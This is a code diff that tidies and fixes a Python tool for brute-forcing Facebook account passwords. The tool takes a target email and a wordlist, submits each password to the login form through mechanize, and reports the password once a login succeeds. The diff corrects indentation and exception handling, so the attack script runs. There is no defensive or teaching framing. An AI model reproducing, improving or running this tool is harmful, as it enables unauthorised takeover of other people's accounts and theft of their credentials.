@@ -6,7 +6,7 @@ try:
  ##----------- Import Libraries -----------##
  import socket,time,os,optparse,mechanize  ##
  ##----------------------------------------##
-except:
+except ImportError:
 	print("[!] The [ mechanize library ] is Missing!\n[*] Please Install it Using this command> [ pip install mechanize ]")
 	exit(1)
 ################## check internet #################
@@ -43,55 +43,54 @@ def Main():
      passw = options.wlst
      global check
      if check == True:
-	         try:
-		    passwfile = open(passw, "r")
-		 except:
-                        print("\n[!] No Such File: "+passw+"  !!!\n")
-                        exit(1)
-		 os.system("cls || clear")
-		 time.sleep(0.10)
-		 print("\n[*] website>: www.facebook.com ")
-		 time.sleep(0.10)
-		 print("\n[+] Target Email>: "+str(user))
-		 time.sleep(0.10)
-		 print("\n[@] WordList>: "+str(passw))
-		 time.sleep(0.10)
-		 print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
-		 time.sleep(0.20)
-		 print("\n[$]--- Brute Force Attack Start ---[$]\n")
-		 time.sleep(0.8)
-		 lo = 1
-		 for password in passwfile:
-				          try:
-                		             br1=mechanize.Browser()
-                		             br1.set_handle_robots(False)
-                                             br1.addheaders=[('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
-                		             op=br1.open("https://facebook.com")
-		
-                	                     br1.select_form(nr=0)
-                		             br1.form["email"]=user
-                		             br1.form["pass"]=password
-                		             br1.method="POST"
-                		             res = br1.submit()
-					     result = res.get_data()
-					     if "home_icon" in result:
-                                                print("[+]~[{}] Trying Password[ {} ]  ==> Yes :)".format(lo,password.strip()))
-                   			        print ("\n[*] Found! Password is ==> "+ password)
-					        break
-						
-                		             else:
-                    			          print('[-]~[{}] Testing password[ {} ] ==> No :('.format(lo,password.strip()))
-                    			          lo +=1
-            			          except KeyboardInterrupt:
-                                                 print('\n---------------------------\n[!][CTRL+C] Exiting.....!\n')
-						 exit(1)
+         try:
+             passwfile = open(passw, "r")
+         except IOError:
+             print("\n[!] No Such File: "+passw+"  !!!\n")
+             exit(1)
+         os.system("cls||clear")
+         time.sleep(0.10)
+         print("\n[*] website>: www.facebook.com ")
+         time.sleep(0.10)
+         print("\n[+] Target Email>: "+str(user))
+         time.sleep(0.10)
+         print("\n[@] WordList>: "+str(passw))
+         time.sleep(0.10)
+         print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
+         time.sleep(0.20)
+         print("\n[$]--- Brute Force Attack Start ---[$]\n")
+         time.sleep(0.8)
+         lo = 1
+         for password in passwfile:
+             if not password.strip(): continue
+             password = password.strip()
+             try:
+                 br=mechanize.Browser()
+                 br.set_handle_robots(False)
+                 br.addheaders=[('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
+                 br.open("https://facebook.com")
+                 br.select_form(nr=0)
+                 br.form["email"]=user
+                 br.form["pass"]=password
+                 br.method="POST"
+                 res = br.submit()
+                 if "home_icon" in res.get_data():
+                     print("[+]~[{}] Trying Password[ {} ]  ==> Yes :)".format(lo,password.strip()))
+                     print ("\n[*] Found! Password is ==> "+ password)
+                     break
+                 else:
+                     print('[-]~[{}] Testing password[ {} ] ==> No :('.format(lo,password.strip()))
+                     lo +=1
+             except KeyboardInterrupt:
+                 print('\n---------------------------\n[!][CTRL+C] Exiting.....!\n')
+                 time.sleep(1.2)
+                 exit(1)
      elif check == False:
-		    print("\n[!] Please Check Your Internet Connection !!!")
-		    exit(1)
+         print("\n[!] Please Check Your Internet Connection !!!")
+         exit(1)
    else:
-	print(parse.usage)
-	exit(1)
-
+       print(parse.usage)
+       exit(1)
 if __name__=='__main__':
 	Main()
 	
